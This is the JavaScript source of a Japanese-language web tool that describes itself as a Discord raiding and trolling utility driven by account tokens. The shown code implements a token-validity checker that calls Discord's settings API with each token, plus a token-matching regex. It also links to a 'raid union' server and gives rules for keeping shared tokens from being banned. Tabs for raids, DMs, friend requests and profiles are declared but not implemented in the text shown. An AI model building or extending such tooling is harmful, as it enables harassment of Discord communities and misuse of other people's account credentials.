(function () {
    'use strict';
    //--------------------------------------------------
    function copy(str, useExecCommand) {
        if (!useExecCommand && typeof navigator === 'object' && typeof navigator.clipboard === 'object' &&
            typeof location === 'object' && location.protocol === 'https:') navigator.clipboard.writeText(str).catch(function () {
                copy(str, true);
            });
        else {
            var e = $('<textarea>').val(str).appendTo('body').select();
            try {
                document.execCommand('copy');
            } catch (e) {
                throw e;
            } finally {
                e.remove();
            }
        }
    }
    function outputLog(logElm, options) {
        if ('tabBtn' in options) options.tabBtn.click();
        logElm.val(('messageonly' in options && !!options.messageonly ? options.message :
            [
                '[' + new Date().toString().match(/\d{2}:\d{2}:\d{2}/)[0] + ']',
                '(' + [
                    'error' in options ? (!!options.error ? 'ERR' : 'OK') : 'NULL',
                    'status' in options ? '#' + options.status : '',
                    'method' in options ? '@' + options.method : ''
                ].join('') + ')',
                'token' in options ? '@' + options.token : '',
                'message' in options ? ': ' + options.message : ''
            ].join('')) + (logElm.val().length > 0 ? '\n' + logElm.val() : '')).trigger('updatetext');
    }
    function makeSummaryHeader(str) {
        return $('<span>').text(str).css({
            fontSize: '14px',
            color: 'white'
        })[0].outerHTML;
    }
    function makeSummaryEmphasis(str) {
        return $('<span>').text(str).css('color', 'crimson')[0].outerHTML;
    }
    function makeLink(title, href, noNewTab) {
        var e = $('<a>', { href: href }).text(title).css('color', '#00b0f4');
        if (!noNewTab) e.attr({
            target: '_blank',
            rel: 'noopener noreferrer'
        });
        return e[0].outerHTML;
    }
    function splitLine(str) {
        return str.split('\n').filter(function (v) {
            return v.length > 0;
        });
    }
    function initInterval(num) {
        num = Number(num);
        return !isFinite(num) || isNaN(num) || num < 0 ? 0.5 : num;
    }
    function makeDelay(delay, i, o, len) {
        return (i + (o || 0) * (len || 0)) * initInterval(delay) * 1000;
    }
    function disbaledElements(elm, bool, btnNames) {
        return elm.add(elm.find('*')).each(function (i, e) {
            e.disabled = !!bool;
            if (e.nodeName === 'TEXTAREA' && !e.readOnly ||
                e.nodeName === 'BUTTON' && (Array.isArray(btnNames) ? btnNames : []).indexOf(e.textContent) > -1) e.style.opacity = (!!bool ? 0.5 : 1);
        });
    }
    function addBreak(h, count) {
        return new Array((count || 1) + 1).join(0).split('').map(function () {
            return $('<br>').appendTo(h || 'body');
        });
    }
    function addBtn(h, title, func) {
        return $('<button>').text(title).appendTo(h || 'body').on('click', func);
    }
    function addInput(h, title, placeholder, readonly) {
        var holder = $('<div>').css('overflow-x', 'auto').appendTo(h || 'body').append($('<span>').text(title).css({
            padding: '0.125em 0.5em',
            whiteSpace: 'nowrap',
            fontSize: '14px',
            backgroundColor: 'rgba(255, 255, 255, 0.5)'
        })),
            e = $('<input>', {
                placeholder: placeholder
            }).css({
                padding: '0.25em',
                outline: 'none',
                color: 'lightgray',
                backgroundColor: 'rgba(0, 0, 0, 0.25)'
            }).appendTo(holder);
        if (!!readonly) e.attr('readonly', true).css({
            tabIndex: '-1',
            cursor: 'pointer',
            color: 'black',
            backgroundColor: 'rgba(255, 255, 255, 0.5)'
        }).on('click', function () {
            copy(e.val());
            e.select();
        });
        return holder;
    }
    function addTextarea(h, placeholder, readonly) {
        var holder = $('<div>').appendTo(h || 'body'),
            e = $('<textarea>', {
                placeholder: placeholder
            }).css({
                padding: '0.5em',
                width: '80%',
                height: '3em',
                maxWidth: '80%',
                outline: 'none',
                borderRadius: '10px',
                color: 'lightgray',
                backgroundColor: 'rgba(0, 0, 0, 0.25)'
            }).appendTo(holder);
        if (!!readonly) e.attr('readonly', true).css({
            tabIndex: '-1',
            cursor: 'pointer',
            borderTopLeftRadius: '0px',
            color: 'black',
            backgroundColor: 'rgba(255, 255, 255, 0.5)'
        }).on('click', function () {
            copy(e.val());
            e.select();
        }).before($('<span>').text('出力専用（テキストエリアをクリックでコピー）').css({
            padding: '0px 0.5em',
            borderTopRightRadius: '5px',
            borderTopLeftRadius: '5px',
            fontSize: '12px',
            backgroundColor: 'rgba(255, 255, 255, 0.25)'
        }).add($('<br>')));
        function resize() {
            var placeholderLine = e.attr('placeholder').split('\n').length,
                line = e.val().split('\n').length;
            e.css('height', (placeholderLine > line && e.val().length === 0 ? placeholderLine : line + 2) + 'em');
        }
        e.on('updatetext change click', resize).trigger('updatetext');
        return holder;
    }
    function addTab(h, area) {
        var holder = $('<div>').appendTo(h || 'body'),
            tabs = $('<div>').css({
                maxWidth: '100%',
                display: 'inline-flex',
                whiteSpace: 'nowrap',
                overflowX: 'auto',
                borderTopRightRadius: '5px',
                borderTopLeftRadius: '5px'
            }).appendTo(holder),
            container = $('<div>').css({
                padding: '1em',
                border: 'solid 2.5px darkgray',
                borderBottomRightRadius: '5px',
                borderBottomLeftRadius: '5px'
            }).appendTo(holder);
        function getSize(str) {
            var e = $('<button>').text(str).css({
                padding: '0.25em 1.25em',
                outline: 'none',
                border: 'none'
            }).appendTo('body'),
                size = e[0].offsetWidth;
            e.remove();
            return size + 'px';
        }
        function mousehover(e) {
            $(e.target).css({
                minWidth: getSize($(e.target).text()),
                textOverflow: 'clip',
                backgroundColor: 'gray'
            });
        }
        function mouseleave(e) {
            $(e.target).css({
                minWidth: '0px',
                textOverflow: 'ellipsis',
                backgroundColor: 'dimgray'
            });
        }
        Object.keys(area).forEach(function (k) {
            (function (k) {
                addBtn(tabs, k, function (e) {
                    tabs.children().css({
                        minWidth: '0px',
                        textOverflow: 'ellipsis',
                        color: 'lightgray',
                        backgroundColor: 'dimgray'
                    }).on({
                        mouseenter: mousehover,
                        mouseleave: mouseleave
                    });
                    $(e.target).css({
                        minWidth: getSize($(e.target).text()),
                        textOverflow: 'clip',
                        color: 'black',
                        backgroundColor: 'darkgray'
                    }).off({
                        mouseenter: mousehover,
                        mouseleave: mouseleave
                    });
                    container.children().each(function (i, e) {
                        $(e).hide();
                    });
                    area[k].show();
                    $(window).trigger('resize');
                }).css({
                    padding: '0.25em 1.25em',
                    outline: 'none',
                    overflowX: 'hidden',
                    border: 'none',
                    borderTopRightRadius: '0px',
                    borderTopLeftRadius: '0px',
                    borderBottomRightRadius: '0px',
                    borderBottomLeftRadius: '0px'
                });
            })(k);
            container.append(area[k]);
        });
        tabs.children().first().css('border-top-left-radius', '5px').click();
        tabs.children().last().css('border-top-right-radius', '5px');
        return holder;
    }
    function addSummary(h, html) {
        return $('<div>').css({
            padding: '1em',
            maxWidth: '80%',
            display: 'inline-block',
            borderRadius: '10px',
            backgroundColor: 'rgba(0, 0, 0, 0.25)'
        }).appendTo(h || 'body').append($('<p>').html(Array.isArray(html) ? html.join('<br>') : html).css({
            fontSize: '12px',
            color: 'lightgray'
        }));
    }
    //--------------------------------------------------
    var logOutput,
        channelURLRegExp = /^https?:\/\/discord\.com\/channels\/(\d+)\/(\d)+\/?$/,
        tokenRegExp = /[MNO][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g,
        ajaxTimeoutIds = [],
        area = {},
        logArea = {},
        h = (function (wrapper, cover, header, h, footer) {
            cover.add(header).add(h).add(footer).appendTo(wrapper);
            $('html, body').add(wrapper).add(cover).css({
                margin: '0px',
                padding: '0px',
                width: '100%'
            });
            $(window).on('resize', function () {
                wrapper.css('padding-bottom', footer[0].offsetHeight + 'px');
            }).trigger('resize');
            return h;
        })(
            $('<div>').css({ // wrapper
                minHeight: '100vh',
                position: 'relative',
                boxSizing: 'border-box'
            }).appendTo('body'),
            $('<div>').css({ // cover
                height: '100%',
                top: '0',
                left: '0',
                zIndex: '-1',
                position: 'fixed',
                backgroundColor: 'rgba(0, 0, 0, 0.75)'
            }),
            $('<div>').css({ // header
                padding: '0.5em',
                whiteSpace: 'nowrap',
                boxShadow: 'rgba(0, 0, 0, 0.5) 0px 0px 10px 0px',
                backgroundColor: 'rgba(0, 0, 0, 0.5)'
            }).append($('<h1>').text($('title').text()).css({
                margin: '0px',
                color: 'white'
            }).add($('<div>').text('Ver.3.0.0 | last update: 2021/03/06').css({
                fontSize: '14px',
                color: 'lightgray'
            })).css({
                lineHeight: '1',
                overflow: 'hidden',
                textOverflow: 'ellipsis'
            })),
            $('<div>').css('padding', '1em'), // h
            $('<div>').css({ // footer
                width: '100%',
                bottom: '0px',
                position: 'absolute',
                textAlign: 'center',
                color: 'lightgray',
                backgroundColor: 'rgba(0, 0, 0, 0.5)'
            }).append($('<p>').css('overflow-wrap', 'break-word').append($('<span>').text('このWebサイトのコンテンツは')
                .add($(makeLink('MIT License', 'https://github.com')))
                .add($('<span>').text('に基づきます。© Copyright 2021 '))
                .add($(makeLink('YudachiK2', 'https://github.com/YudachiK2')))).find('a').css({
                    textDecoration: 'none',
                    color: 'white'
                }).hover(function (e) {
                    $(e.target).css({
                        transition: 'color 0.25s',
                        color: 'red'
                    });
                }, function (e) {
                    $(e.target).css('color', 'white');
                }).parent())
        );
    //--------------------------------------------------
    ['説明', '基本設定', '生存確認', 'レイド', '認証', '発言', 'ダイレクトメッセージ', 'フレンドリクエスト', 'プロフィール'].forEach(function (k) {
        area[k] = $('<div>');
    });
    var btnHolder = addSummary(h, '');
    btnHolder.find('p').remove();
    addBreak(h, 2);
    var sendCancelBtn = addBtn(btnHolder, '送信キャンセル', function () {
        sendCancelBtn.prop('disabled', true);
        while (ajaxTimeoutIds.length > 0) {
            var st = ajaxTimeoutIds.pop();
            clearTimeout(st);
            outputLog(logOutput, {
                tabBtn: logOutput.parents().eq(2).prev().children().last(),
                method: 'tool.send_cancel',
                message: 'IDが' + st + 'の送信予定の通信をキャンセルしました。'
            });
        }
        disbaledElements(contentHolder, false, Object.keys(area));
    }).prop('disabled', true);
    addBtn(btnHolder, 'IPアドレスを取得', function (e) {
        $(e.target).prop('disabled', true);
        $.get('https://ipinfo.io/?callback=a').done(function (body, data) {
            var m = data.response.match(/\{.*?\}/);
            if (!m) return;
            prompt('IPアドレス', JSON.parse(m[0]).ip);
            outputLog(logOutput, {
                tabBtn: logOutput.parents().eq(2).prev().children().last(),
                error: false,
                status: data.status,
                method: 'req.get_ip_api',
                message: 'APIからのIPアドレスの取得に成功しました。'
            });
        }).fail(function (data) {
            alert('APIからのIPアドレスの取得に失敗しました。');
            outputLog(logOutput, {
                tabBtn: logOutput.parents().eq(2).prev().children().last(),
                error: true,
                status: data.status,
                method: 'req.get_ip_api',
                message: 'APIからIPアドレスを取得できませんでした。'
            });
        }).always(function () {
            $(e.target).prop('disabled', false);
        });
    });
    var contentHolder = addTab(h, area);
    addSummary(area['説明'], [
        'Tokenを使用したDiscordの荒らしができます。',
        'Tokenの説明、取得方法に関しましては、' + makeLink('コチラ', 'https://shunshun94.github.io/shared/sample/discordAccountToken') + 'を参照してください。',
        'また、ご不明な点や改善してほしい点などございましたら、Discordサーバー' + makeLink('荒らし聯合', 'https://discord.com/invite/sE3Wkdq') + 'か、同サーバー内メンバー' + makeSummaryEmphasis('夕立改二#2068') + 'までお気軽にご連絡ください。',
        '',
        makeSummaryHeader('必読'),
        '以下の事項に反する行為を行った場合、Tokenが使用できなくなる可能性があります。',
        '・DMの送信は異なるIPアドレスからであっても、1日3回までにとどめる',
        '・リクエストの送信間隔は0.5秒以上にする',
        '・Tokenのアカウントのパスワードを変えたり、二段階認証しない',
        '・使用中にIPアドレスなどの通信に関わる設定を変更しない',
        '・同じTokenを同時に複数にIPアドレスから操作しない',
        '・操作ボタンを連打しない',
        '・DM送信の際は使用するTokenの共有者に送信回数等を伝える'
    ]);
    //--------------------------------------------------
    var inputInterval = addInput(area['基本設定'], 'リクエスト送信間隔', '[秒]').find('input').on('change', function () {
        inputInterval.val(initInterval(inputInterval.val().trim()));
    }).val('0.5');
    addBreak(area['基本設定']);
    var inputInvite = addInput(area['基本設定'], '招待リンクID', 'サーバーの招待リンクのIDかリンクを入力').find('input').on('change', function () {
        var str = inputInvite.val().trim(),
            m = str.match(/^https?:\/\/discord\.(?:com\/invite\/([^/]+)\/?|gg\/([^/]+))$/);
        inputInvite.val(m ? m[/^https?:\/\/discord\.gg/.test(str) ? 2 : 1] : str);
    });
    addBreak(area['基本設定']);
    var inputGuildId = addInput(area['基本設定'], 'サーバーID', 'サーバーのIDかチャンネルURLを入力').find('input').on('change', function () {
        var str = inputGuildId.val().trim(),
            m = str.match(channelURLRegExp);
        inputGuildId.val(m ? m[1] : /^\d+$/.test(str) ? str : '');
    });
    inputInvite.add(inputGuildId).css({
        width: '50%'
    });
    addBreak(area['基本設定']);
    var inputToken = addTextarea(area['基本設定'], 'Tokenを改行で区切って入力').find('textarea').on('change', function () {
        inputToken.val((inputToken.val().match(tokenRegExp) || []).filter(function (v, i, arr) {
            return arr.indexOf(v) === i;
        }).join('\n')).trigger('updatetext');
    });
    //--------------------------------------------------
    addSummary(area['生存確認'], [
        'Tokenの生死確認ができます。',
        '',
        makeSummaryHeader('警告'),
        'この機能で死んだと判断されても、それは一時的なものや誤判定である可能性がございますので、この機能は参考程度にご使用ください。',
        '判定の方法は、アカウントのステータスをオンラインにする通信(未ログイン状態のオフラインである場合はオンラインに変わることはありません)を行い、レスポンスによって判定します。'
    ]);
    addBreak(area['生存確認'], 2);
    var aliveTokenOutput, deadTokenOutput, aliveCheckClearBtn;
    addBtn(area['生存確認'], '判定', function () {
        if (inputToken.val().length === 0) outputLog(logOutput, {
            tabBtn: logOutput.parents().eq(2).prev().children().last(),
            error: true,
            method: 'check.input_token',
            message: 'Tokenが入力されていません。'
        });
        splitLine(inputToken.val()).forEach(function (v, i) {
            ajaxTimeoutIds.push(setTimeout(function () {
                disbaledElements(contentHolder, true, Object.keys(area));
                sendCancelBtn.prop('disabled', false);
                $.ajax({
                    type: 'PATCH',
                    url: 'https://discord.com/api/v8/users/@me/settings',
                    headers: {
                        authorization: v,
                        'content-type': 'application/json'
                    },
                    data: JSON.stringify({ status: 'online' })
                }).done(function (body, statusText, data) {
                    outputLog(aliveTokenOutput, {
                        messageonly: true,
                        message: v
                    });
                    outputLog(logOutput, {
                        tabBtn: logOutput.parents().eq(2).prev().children().last(),
                        error: false,
                        status: data.status,
                        method: 'tool.check_alive',
                        token: v,
                        message: '生存と判定されました。'
                    });
                }).fail(function (data) {
                    outputLog(deadTokenOutput, {
                        messageonly: true,
                        message: v
                    });
                    outputLog(logOutput, {
                        tabBtn: logOutput.parents().eq(2).prev().children().last(),
                        error: true,
                        status: data.status,
                        method: 'tool.check_alive',
                        token: v,
                        message: data.responseJSON.message === 'You need to verify your account in order to perform this action.' ? 'アカウントが確認できませんでした。' :
                            data.responseJSON.message === '401: Unauthorized' ? 'Tokenが認証できませんでした。' :
                                '不明なエラーです。'
                    });
                }).always(function () {
                    ajaxTimeoutIds.shift(1);
                    if (ajaxTimeoutIds.length === 0) {
                        disbaledElements(contentHolder, false, Object.keys(area));
                        aliveCheckClearBtn.prop('disabled', false);
                    }
                });
            }, makeDelay(inputInterval.val(), i)));
        });
    });
    aliveCheckClearBtn = addBtn(area['生存確認'], 'クリア', function () {
        aliveCheckClearBtn.prop('disabled', true);
        aliveTokenOutput.add(deadTokenOutput).val('').trigger('updatetext');
    }).prop('disabled', true);
    addBreak(area['生存確認'], 2);
    aliveTokenOutput = addTextarea(area['生存確認'], '生存判定', true).find('textarea');
    deadTokenOutput = addTextarea(area['生存確認'], '死亡判定', true).find('textarea');
    //--------------------------------------------------
    ['説明', 'ログ'].forEach(function (k) {
        logArea[k] = $('<div>');
    });
    addBreak(h);
    addTab(h, logArea);
    addSummary(logArea['説明'], [
        'このログは開発者ツールが利用できない環境でも簡易的に通信情報を見るためのものです。',
        '通信情報以外にも不正な入力値の警告などが表示されます。',
        'ログをコピーして詳しい人に見せることで、通信に詳しくない方でもエラーの原因などを調べることができます。',
        '',
        makeSummaryHeader('注意'),
        'ログを他の場所へ貼る場合は「Tokenを隠す」を推してログ内のTokenを隠すことを推奨します。'
    ]);
    addBtn(logArea['ログ'], 'クリア', function () {
        logOutput.val('').on('updatetext');
    });
    addBtn(logArea['ログ'], 'Tokenを隠す', function () {
        logOutput.val(logOutput.val().replace(tokenRegExp, '[[MaskedToken]]'));
    });
    logOutput = addTextarea(logArea['ログ'], '[hh:mm:ss](STATUS_TEXT#status?@category_name.method_name?)@token?: message?', true).find('textarea');
    //--------------------------------------------------
})();
